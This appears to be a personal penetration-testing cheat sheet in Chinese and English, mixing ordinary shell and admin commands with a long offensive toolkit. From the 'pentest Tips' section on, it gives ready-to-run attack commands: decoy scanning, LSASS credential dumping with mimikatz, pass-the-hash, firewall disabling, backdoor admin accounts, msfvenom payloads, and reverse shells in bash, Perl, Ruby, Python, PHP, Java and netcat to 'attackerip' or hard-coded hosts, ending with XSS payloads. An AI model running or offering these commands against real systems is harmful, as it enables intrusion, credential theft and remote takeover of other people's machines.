wlst.sh /decryptPassword.py "{AES}E4DV+PeDz8zX66O..."
```

# 查看当前登录用户 
```
w
# 查看当前登录的id
id
```

# 各种安全工具下载
```
https://packetstormsecurity.com/files/
```

# 统计词频
```
# 1、扫描质检平台代码，统计、记录白名单关键字
find . -type f -name "*.*"|grep -v '\.(git|svn)'|xargs -I {} file  {}|grep ' text'|sed 's/:.*$//g' | xargs -I {} grep -Eo "\b(\w{2,})\b" {}|sed 's/.*://g'|sort |uniq -c|sort -nr
# 2、扫描webshell，得到结果，并与去除白名单关键字

```

# 
```
 unshadow /etc/passwd /etc/shadow > ~/file_to_crack
 ```

# How to find large files in windows,eg:bak、dmp、mdf
```
# Command to find files with size of more than 100MB
forfiles /S /M * /C "cmd /c if @fsize GEQ 104857600 echo @path"
# Find files with size 1 GB or more.
forfiles /S /M * /C "cmd /c if @fsize GEQ 1073741824 echo @path"
# linux
find / -size +10M -type f -printf "%p %s\n"
```
# 查看网络连接
```
netstat -ant|grep -E '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'|sort -u
```

# 查看网络监听
```
netstat -ant|grep LISTEN
```

# 查找文件类型，并统计文件个数
```
$ find . -type f -name "*.*"|grep -Eo '\.[a-zA-Z]{1,4}$'| LC_ALL=C sort | LC_ALL=C uniq -c|sort -r

1316 .txt
 507 .xml
 191 .css
 184 .js
  75 .png
  59 .py
```

# how copy locked file
```
cd /Volumes/data/tools/
mkdir hobocopy;cd hobocopy
# https://github.com/candera/hobocopy/downloads
# 32-bit (x86) release for Windows 2003, 2008, Vista, and Windows 7
wget https://github.com/downloads/candera/hobocopy/HoboCopy-1.0.0.0-W2K3-Vista-32bit-Release.zip
# 64-bit (x64) release for Windows 2003, 2008, Vista, and Windows 7
wget https://github.com/downloads/candera/hobocopy/hobocopy-1.0.0.0-W2K3-Vista-x64-Release.zip
# W2K3, Vista, Win7  32-bit 
wget https://github.com/downloads/candera/hobocopy/hobocopy-unstable-32bit-20110505-01.zip
# W2K3, Vista, Win7  64-bit
wget https://github.com/downloads/candera/hobocopy/hobocopy-unstable-64bit-20110505-01.zip
# XP
wget https://github.com/downloads/candera/hobocopy/hobocopy-unstable-XP-32bit-20110505-01.zip
```

# how install tor in centos
```
yum install epel-release

yum install libevent-devel libevent
yum isntall gcc
yum install openssl-devel 


wget https://www.torproject.org/dist/tor-0.3.3.9.tar.gz
tar xzf tor-0.3.3.9.tar.gz; cd tor-0.3.3.9
cd tor-0.3.3.9;./configure && make
make install

tmux
adduser tor -N -M  --shell=/bin/bash
mkdir /home/tor
chown -R tor /home/tor
passwd tor
**&57%$#2--87KJHvhk-*78
su tor
tor &

```

# 万能的cheat sheet
```
curl cheat.sh/bash
# 其中bash可有是其他你需要的key
#在线命令行获取天气
curl wttr.in/chengdu
# https://github.com/chubin/awesome-console-services
# 获取当前ip
curl https://canihazip.com/s
curl icanhazip.com
curl ipecho.net/plain
curl ident.me

curl ipinfo.io/117.176.19.138
curl curlmyip.net
curl ifcfg.me
curl ip-addr.es
dig +short myip.opendns.com @resolver1.opendns.com
```

# 捕获url中zip、pdf
```
wget https://github.com/Hack-with-Github/Free-Security-eBooks/blob/master/README.md
cat README.md|grep -Eo '"(http://.*?)"'|sed 's/"//g'|grep -E 'pdf|zip' |xargs wget

```

# 提取grep中匹配到的内容
```
$ cat out1.txt
><Proxy US 1.02s [HTTPS] 151.106.52.124:1080>
>....

$ cat out1.txt out.txt|grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]{1,}"|sort -u >kk.txt
>151.106.52.124:1080
...
```

# 更新checkUrl
运行，启动动态代理，自动使用autoProxy.txt中的代理，收集来源若干网站的合集
```
git clone https://github.com/hktalent/myhktools.git;cd myhktools
node proxy/ProxyServer.js -u
```
### 测试
```
$ curl -x 'http://127.0.0.1:8880' ip.cn
当前 IP：178.22.195.150 来自：俄罗斯
```
# 一些常用命令
```
find . -name "*linux*.pdf" -exec mv {} ./linux/ \;
```

# 生成反弹shell
```
$ msfvenom -p cmd/unix/reverse_bash LHOST=192.168.24.10 LPORT=4444 -f raw
0<&218-;exec 218<>/dev/tcp/192.168.24.10/4444;sh <&218 >&218 2>&218

```
# nodeJs 如何控制异步，通常使用内置的事件来驱动
```
// # nodeJs 如何控制异步，通常使用内置的事件来驱动
var EventEmitter = require('events').EventEmitter,
	inherits = require('util').inherits,
	n_maxLs = 333;

EventEmitter.prototype._maxListeners = n_maxLs;
var _fnNull = function(e){console.log(e)};
process.on('uncaughtException', _fnNull);
process.on('unhandledRejection', _fnNull);
EventEmitter.defaultMaxListeners = n_maxLs;
process.env.NODE_TLS_REJECT_UNAUTHORIZED = 0;
function fnTest()
{
	EventEmitter.call(this);
	this.defaultMaxListeners = n_maxLs;
	var _t = this;
	_t.myFunc = function(){
	   // 发送事件、也叫消息
	   _t.emit('log',"message");
	}
}

inherits(fnTest, EventEmitter);

var oT = new fnTest();
// 先注册要处理的事件
oT.on('log',function(s)
{
   console.log(s)
});
oT.myFunc();


```
# 关键词
```
wget https://github.com/hktalent/data/keys.txt
sort -u keys.txt >>keys1.txt;mv keys1.txt keys.txt

cat ~/Downloads/20180706_095031AllJarName.txt |grep -e '.*fastjson.*'|grep -v -e  '1.[2-4].[3-4][0-9]'|grep -v -e '1.2.2[0-9]'|wc -l

cat ~/Downloads/20180706_095031AllJarName.txt|sed 's/.*\///g'|grep -v '._struts2-core-2.3.24.jar' |grep -e '.*struts2-core.*2.*\.jar'|grep -v '33.jar'|grep -v '2.5'|grep -v '34.jar'|sort -u

```

# 扫描安全头信息
```
https://securityheaders.com
做得好的参考：
https://securityheaders.com/?q=https%3A%2F%2Fwww.regdomsa1.co.za%2F

Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-XSS-Protection: 1; mode=block
Content-Security-Policy: upgrade-insecure-requests
Referrer-Policy: strict-origin-when-cross-origin
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Type: text/html
```
# Burp awesome collection 
```
https://github.com/nccgroup/freddy
https://github.com/federicodotta/Java-Deserialization-Scanner
https://github.com/nccgroup/AutoRepeater
https://github.com/yw9381/Burp_Suite_Doc_zh_cn
https://github.com/xl7dev/BurpSuite
https://github.com/vulnersCom/burp-vulners-scanner
https://github.com/summitt/Burp-Non-HTTP-Extension
https://github.com/federicodotta/Brida
https://github.com/allfro/BurpKit
https://github.com/albinowax/ActiveScanPlusPlus
https://github.com/SecurityInnovation/AuthMatrix
https://github.com/0x4D31/burpa

```

# Offensive Web Testing Framework (OWTF)
https://github.com/owtf/owtf

# 黑客技能
https://github.com/coreb1t/awesome-pentest-cheat-sheets
https://github.com/nixawk/pentest-wiki
https://github.com/enaqx/awesome-pentest
https://github.com/dloss/python-pentest-tools

https://github.com/Hack-with-Github/Awesome-Hacking
https://github.com/seifreed/malware-scripts
https://github.com/onethawt/reverseengineering-reading-list
https://github.com/sroberts/awesome-iocs
https://github.com/onlurking/awesome-infosec
https://github.com/PowerShellMafia/PowerSploit
https://github.com/ShawnDEvans/smbmap
https://github.com/SpiderLabs/jboss-autopwn
### windows-kernel-exploits Windows平台提权漏洞集合
https://github.com/SecWiki/windows-kernel-exploits
https://www.sec-wiki.com
### 各种注入
https://github.com/swisskyrepo/PayloadsAllTheThings

# 使用vulners
```
详见：https://github.com/vulnersCom/nmap-vulners
cd /usr/local/Cellar/nmap/7.70/share/nmap/scripts/
wget https://github.com/vulnersCom/nmap-vulners/raw/master/vulners.nse
nmap -sV --script vulners erp.xxx.com
```

# metasploit远程通过msgrpc交互
https://github.com/DanMcInerney/msf-autopwn
https://github.com/rpranshu/Autopwn
https://github.com/bannsec/autoPwn
https://github.com/hahwul/metasploit-db_autopwn
https://github.com/vnik5287/wpa-autopwn
https://github.com/DanMcInerney/smb-autopwn

```
cd /Users/`whoami`/.msf4/plugins
wget https://raw.githubusercontent.com/hahwul/metasploit-db_autopwn/master/db_autopwn.rb
msfconsole
load db_autopwn
db_autopwn -p -R great -e -q 192.168.56.101
```

# smb漏洞扫描
```
rm mtx_7.tmp
mtx_7=`echo ${rtpswd} | sudo -S masscan -p445 --rate=100000 192.168.3.1/26`
echo $mtx_7|sed -e 's/Discovered open port 445\/tcp on /\
/g' >> mtx_7.tmp
cat mtx_7.tmp
echo ${rtpswd} | sudo -S nmap -Pn -sS -T4 -iL mtx_7.tmp --script smb-vuln-ms17-010,smb-vuln-ms08-067 -n --max-retries 5 -oX 445.xml -p 445 -oA smb-scan
rm mtx_7.tmp
```

# 常用安全平台、工具
```
Kali Linux
Web Developer
Hackbar - Not compatible with Firefox Quantum
Burp Proxy
Fiddler
DirBuster
GoBuster
Knockpy
SQLmap
Nikto
Nessus
Recon-ng
Wappalyzer
Metasploit
OpenVAS
```
# 教学
```
https://github.com/sbilly/awesome-security
https://github.com/carpedm20/awesome-hacking
https://www.hacksplaining.com/lessons
https://www.kitploit.com/2018/06/
https://github.com/qazbnm456/awesome-web-security
```

## IP各种绕过编码
https://github.com/D4Vinci/Cuteit

# 安全渗透武器库
```
https://github.com/dloss/python-pentest-tools
https://github.com/swisskyrepo/PayloadsAllTheThings
https://github.com/rmusser01/Infosec_Reference

PenCrawLer - An Advanced Web Crawler And DirBuster
http://www.kitploit.com/2018/04/pencrawler-advanced-web-crawler-and.html

路由器渗透
RouterSploit v3.0 - Exploitation Framework For Embedded Devices
https://www.kitploit.com/2018/06/routersploit-v30-exploitation-framework.html
 
 Pentesting suite for Maltego based on data in a Metasploit database
 https://github.com/shizzz477/msploitego
```
#### Offensive Web Testing Framework (OWTF)
https://github.com/owtf/owtf


## python经典知识库
https://github.com/vinta/awesome-python

### 网络实时分析
```
go get github.com/redhat-cip/skydive/cmd/skydive
```

# 情报工具集
```
OSInt Tools

Maltego - Proprietary software for open source intelligence and forensics, from Paterva.
theHarvester - E-mail, subdomain and people names harvester
creepy - A geolocation OSINT tool
metagoofil - Metadata harvester
Google Hacking Database - a database of Google dorks; can be used for recon
Censys - Collects data on hosts and websites through daily ZMap and ZGrab scans
Shodan - Shodan is the world's first search engine for Internet-connected devices
recon-ng - A full-featured Web Reconnaissance framework written in Python
github-dorks - CLI tool to scan github repos/organizations for potential sensitive information leak
vcsmap - A plugin-based tool to scan public version control systems for sensitive information
ZoomEye - ZoomEye is a search engine for cyberspace that lets the user find specific network components(ip, services, etc.).
```

# docker
```
docker pull 'mikesplain/openvas'
docker images
docker run --name openvas -P 'mikesplain/openvas'
https://127.0.0.1:32770/omp?r=1&token=e88f64b8-6135-49a2-b1d4-d38417d203c9
admin/admin

docker ps -a
docker ps --no-trunc
进入bash
docker exec -it 7436b8485fc1fca1a41559b76b02df3f9e5ca46bd496b9854be169bfe2287925 bash
```

### use serialkiller-bypass-gadgets
```
cd /Users/`whoami`/safe/top20
java -jar serialkiller-bypass-gadgets-0.0.1-SNAPSHOT-all.jar Jdk7u21 Beanutils1 whoami
```

### awk多关键字"与"运算
```
awk  '/xxx/ && /www/ && /w{3}/' hosts.txt
awk 'BEGIN{FS=“."}{print $1}'
```

# pentest Tips

### Nmap Full Web Vulnerable Scan
```
cd /usr/share/nmap/scripts/
wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz
nmap -sS -sV --script=vulscan/vulscan.nse target
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target
nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target
nmap -sV --script=vuln target
nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target

masscan --rate=1000 -p445 192.168.1.1/16 -oX gs445.xml

nmap -p 445 -iL yh445.txt --script=smb-double-pulsar-backdoor

```
### Dirb Dir Bruteforce:
```
dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt
```

### Nikto web server scanner
```
nikto -C all -h http://IP
```

### WordPress Scanner
```
git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
./wpscan –url http://IP/ –enumerate p
```
### HTTP Fingerprinting
```
wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
cd httprint_301/linux/
./httprint -h http://IP -s signatures.txt
```
### SKIP Fish Scanner
```
skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
```

### Nmap Ports Scan
```
1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)
1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)
2)fargement
3)data packed – like orginal one not scan packet
4)use auxiliary/scanner/ip/ipidseq for find zombie ip in network to use them to scan — nmap -sI ip target
5)nmap –source-port 53 target
nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target ( Randomize scan form diff IP)
nmap -Pn -T2 -sV –randomize-hosts IP1,IP2
nmap –script smb-check-vulns.nse -p445 target (using NSE scripts)
nmap -sU -P0 -T Aggressive -p123 target (Aggresive Scan T1-T5)
nmap -sA -PN -sN target
nmap -sS -sV -T5 -F -A -O target (version detection)
nmap -sU -v target (Udp)
nmap -sU -P0 (Udp)
nmap -sC 192.168.31.10-12 (all scan default)
```
### NC Scanning
```
nc -v -w 1 target -z 1-1000
for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
```
### Unicornscan
```
us -H -msf -Iv 192.168.56.101 -p 1-65535
us -H -mU -Iv 192.168.56.101 -p 1-65535

-H resolve hostnames during the reporting phase
-m scan mode (sf - tcp, U - udp)
-Iv - verbose
```
### Xprobe2 OS fingerprinting
```
xprobe2 -v -p tcp:80:open IP
```
### Samba Enumeration
```
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target
```
### SNMP Enumeration
```
snmpget -v 1 -c public IP
snmpwalk -v 1 -c public IP
snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
```
### Windows Useful cmds
```
net localgroup Users
net localgroup Administrators
search dir/s *.doc
system("start cmd.exe /k $cmd")
sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore
/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits
C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits
```
### PuTTY Link tunnel
```
Forward remote port to local address
plink.exe -P 22 -l root -pw "1234" -R 445:127.0.0.1:445 IP
```
### Meterpreter portfwd
```
# https://www.offensive-security.com/metasploit-unleashed/portfwd/
# forward remote port to local address
meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
kali > rdesktop 127.0.0.1:3389
```
### Enable RDP Access
```
reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
```
### Turn Off Windows Firewall
```
netsh firewall set opmode disable
```
### Meterpreter VNC\RDP
```
# https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
run getgui -u admin -p 1234
run vnc -p 5043
```
### Add New user in Windows
```
net user test 1234 /add
net localgroup administrators test /add
```
### Mimikatz use
```
git clone https://github.com/gentilkiwi/mimikatz.git
privilege::debug
sekurlsa::logonPasswords full
```
### Passing the Hash
```
git clone https://github.com/byt3bl33d3r/pth-toolkit
pth-winexe -U hash //IP cmd

or

apt-get install freerdp-x11
xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP

or

meterpreter > run post/windows/gather/hashdump
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) > exploit
meterpreter > shell
```
### Hashcat password cracking
```
hashcat -m 400 -a 0 hash /root/rockyou.txt
```
### Netcat examples
```
c:> nc -l -p 31337
#nc 192.168.0.10 31337
c:> nc -v -w 30 -p 31337 -l < secret.txt
#nc -v -w 2 192.168.0.10 31337 > secret.txt
```
### Banner grabbing with NC
```
nc 192.168.0.10 80
GET / HTTP/1.1
Host: 192.168.0.10
User-Agent: Mozilla/4.0
Referrer: www.example.com
<enter>
<enter>
```
### Window reverse shell
```
c:>nc -Lp 31337 -vv -e cmd.exe
nc 192.168.0.10 31337
c:>nc example.com 80 -e cmd.exe
nc -lp 80

nc -lp 31337 -e /bin/bash
nc 192.168.0.10 31337
nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000
```
### Find SUID\SGID root files
```
# Find SUID root files
find / -user root -perm -4000 -print

# Find SGID root files:
find / -group root -perm -2000 -print

# Find SUID and SGID files owned by anyone:
find / -perm -4000 -o -perm -2000 -print

# Find files that are not owned by any user:
find / -nouser -print

# Find files that are not owned by any group:
find / -nogroup -print

# Find symlinks and what they point to:
find / -type l -ls
```
### Python shell
```
python -c 'import pty;pty.spawn("/bin/bash")'
```
### Python\Ruby\PHP HTTP Server
```
python2 -m SimpleHTTPServer
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start"
php -S 0.0.0.0:8888
``` 
### Get PIDs of process
```
fuser -nv tcp 80
fuser -k -n tcp 80
```
### Hydra rdp Bruteforce
```
hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp
```
### Mount Remote Windows Share
```
smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
```
### Compiling Exploit in Kali
```
gcc -m32 -o output32 hello.c (32 bit)
gcc -m64 -o output hello.c (64 bit)
```
### Compiling Windows Exploits on Kali
```
wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
wine mingw-get-setup.exe
select mingw32-base
cd /root/.wine/drive_c/windows
wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
cd /root/.wine/drive_c/MinGW/bin
wine gcc -o ability.exe /tmp/exploit.c -lwsock32
wine ability.exe
```
### NASM Commands
```
nasm -f bin -o payload.bin payload.asm
nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload
```
### SSH Pivoting
```
ssh -D 127.0.0.1:1080 -p 22 user@IP
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains commands target
```
### SSH Pivoting from One Network to Another

```
ssh -D 127.0.0.1:1080 -p 22 user1@IP1
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
proxychains commands target
```

### Pivoting Using metasploit
```
route add X.X.X.X 255.255.255.0 1
use auxiliary/server/socks4a
run
proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E

or

# https://www.offensive-security.com/metasploit-unleashed/pivoting/
meterpreter > ipconfig
IP Address  : 10.1.13.3
meterpreter > run autoroute -s 10.1.13.0/24
meterpreter > run autoroute -p
10.1.13.0          255.255.255.0      Session 1
meterpreter > Ctrl+Z
msf auxiliary(tcp) > use exploit/windows/smb/psexec
msf exploit(psexec) > set RHOST 10.1.13.2
msf exploit(psexec) > exploit
meterpreter > ipconfig
IP Address  : 10.1.13.2
```
### Exploit-DB search using CSV File
```
git clone https://github.com/offensive-security/exploit-database.git
cd exploit-database
./searchsploit –u
./searchsploit apache 2.2
./searchsploit "Linux Kernel"

cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep "<|<=" | sort -k3
```
### MSF Payloads
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 --platform win -f asp -o file.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b "\x00" -a x86 --platform win -f c
```
### MSF Linux Reverse Meterpreter Binary
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 --platform linux -o shell
```
### MSF Reverse Shell (C Shellcode)
```
msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b "\x00\x0a\x0d" -a x86 --platform win -f c
```
### MSF Reverse Shell Python Script
```
msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
```
### MSF Reverse ASP Shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp -a x86 --platform win -o shell.asp
```
### MSF Reverse Bash Shell
```
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh
```

### MSF Reverse PHP Shell
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php
add <?php at the beginning
perl -i~ -0777pe's/^/<?php \n/' shell.php
```

### MSF Reverse Win Bin
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 --platform win -o shell.exe
```

### Linux Security Commands
```
# find programs with a set uid bit
find / -uid 0 -perm -4000

# find things that are world writable
find / -perm -o=w

# find names with dots and spaces, there shouldn’t be any
find / -name " " -print
find / -name ".." -print
find / -name ". " -print
find / -name " " -print

# find files that are not owned by anyone
find / -nouser

# look for files that are unlinked
lsof +L1

# get information about procceses with open ports
lsof -i

# look for weird things in arp
arp -a

# look at all accounts including AD
getent passwd

# look at all groups and membership including AD
getent group

# list crontabs for all users including AD
for user in $(getent passwd|cut -f1 -d:); do echo "### Crontabs for $user ####"; crontab -u $user -l; done

# generate random passwords
cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&*()_+{}|:<>?=’|fold -w 12| head -n 4

# find all immutable files, there should not be any
find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’

# fix immutable files
chattr -i file
```

### Win Buffer Overflow Exploit Commands

```
msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b "\x00" -f c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b "\x00" -f c

COMMONLY USED BAD CHARACTERS:
\x00\x0a\x0d\x20                              For http request
\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)

# Useful Commands:
pattern create
pattern offset (EIP Address)
pattern offset (ESP Address)
add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )

!pvefindaddr pattern_create 5000
!pvefindaddr suggest
!pvefindaddr modules
!pvefindaddr nosafeseh

!mona config -set workingfolder C:\Mona\%p
!mona config -get workingfolder
!mona mod
!mona bytearray -b "\x00\x0a"
!mona pc 5000
!mona po EIP
!mona suggest
```
### SEH - Structured Exception Handling
```
# https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH
!mona suggest
!mona nosafeseh
nseh="\xeb\x06\x90\x90" (next seh chain)
iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)
```
### ROP (DEP)
```
# https://en.wikipedia.org/wiki/Return-oriented_programming
# https://en.wikipedia.org/wiki/Data_Execution_Prevention
!mona modules
!mona ropfunc -m *.dll -cpb "\x00\x09\x0a"
!mona rop -m *.dll -cpb "\x00\x09\x0a" (auto suggest)
```
### ASLR - Address space layout randomization
```
# https://en.wikipedia.org/wiki/Address_space_layout_randomization
!mona noaslr
```
### EGG Hunter techniques
```
# https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
# http://www.fuzzysecurity.com/tutorials/expDev/4.html
!mona jmp -r esp
!mona egg -t lxxl
\xeb\xc4 (jump backward -60)
buff=lxxllxxl+shell
!mona egg -t 'w00t'
```
### GDB Debugger Commands
```
# Setting Breakpoint
break *_start

# Execute Next Instruction
next
step
n
s

# Continue Execution
continue
c

# Data
checking 'REGISTERS' and 'MEMORY'

# Display Register Values: (Decimal,Binary,Hex)
print /d –> Decimal
print /t –> Binary
print /x –> Hex
O/P :
(gdb) print /d $eax
$17 = 13
(gdb) print /t $eax
$18 = 1101
(gdb) print /x $eax
$19 = 0xd
(gdb)

# Display values of specific memory locations
command : x/nyz (Examine)
n –> Number of fields to display ==>
y –> Format for output ==> c (character) , d (decimal) , x (Hexadecimal)
z –> Size of field to be displayed ==> b (byte) , h (halfword), w (word 32 Bit)
```
### BASH Reverse Shell
```
bash -i >& /dev/tcp/X.X.X.X/443 0>&1

exec /bin/bash 0&0 2>&0
exec /bin/bash 0&0 2>&0

0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

exec 5<>/dev/tcp/attackerip/4444 cat <&5 | while read line; do $line 2>&5 >&5; done # or: while read line 0<&5; do $line 2>&5 >&5; done
exec 5<>/dev/tcp/attackerip/4444

cat <&5 | while read line; do $line 2>&5 >&5; done # or:
while read line 0<&5; do $line 2>&5 >&5; done

/bin/bash -i > /dev/tcp/attackerip/8080 0<&1 2>&1
/bin/bash -i > /dev/tcp/X.X.X.X/443 0<&1 2>&1
```
### PERL Reverse Shell
```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

# for win platform
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};’
```
### RUBY Reverse Shell
```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# for win platform
ruby -rsocket -e 'c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
ruby -rsocket -e 'f=TCPSocket.open("attackerip","443").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
### PYTHON Reverse Shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("162.219.126.11",8891));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
### PHP Reverse Shell
```
php -r '$sock=fsockopen("attackerip",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```
### JAVA Reverse Shell
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/attackerip/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### NETCAT Reverse Shell
```
nc -e /bin/sh attackerip 4444
nc -e /bin/sh 192.168.37.10 443

# If the -e option is disabled, try this
# mknod backpipe p && nc attackerip 443 0<backpipe | /bin/bash 1>backpipe
/bin/sh | nc attackerip 443
rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4443 0/tmp/

# If you have the wrong version of netcat installed, try
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip >/tmp/f
```
### TELNET Reverse Shell
```
# If netcat is not available or /dev/tcp
mknod backpipe p && telnet attackerip 443 0<backpipe | /bin/bash 1>backpipe
```
### XTERM Reverse Shell
```
# Start an open X Server on your system (:1 – which listens on TCP port 6001)
apt-get install xnest
Xnest :1

# Then remember to authorise on your system the target IP to connect to you
xterm -display 127.0.0.1:1

# Run this INSIDE the spawned xterm on the open X Server
xhost +targetip

# Then on the target connect back to the your X Server
xterm -display attackerip:1
/usr/openwin/bin/xterm -display attackerip:1
or
$ DISPLAY=attackerip:0 xterm
```
### XSS Cheat Codes
```
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
("< iframes > src=http://IP:PORT </ iframes >")

<script>document.location=http://IP:PORT</script>

';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//–></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

";!–"<XSS>=&amp;amp;{()}

<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"">
